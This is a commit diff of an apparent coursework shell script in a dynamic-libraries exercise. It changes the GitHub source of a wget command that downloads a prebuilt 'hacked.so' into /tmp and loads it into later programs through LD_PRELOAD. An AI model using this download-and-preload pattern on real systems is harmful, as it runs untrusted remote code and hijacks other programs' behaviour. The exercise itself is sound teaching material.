6dc8f41a8d1274006e12b47852344737a12d281d
TOCVIC <86574097+TOCVIC@users.noreply.github.com>
2022-12-13 01:25:52 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Barackhalogen/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+wget -P /tmp https://github.com/TOCVIC/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
 export LD_PRELOAD=/tmp/hacked.so
 
 
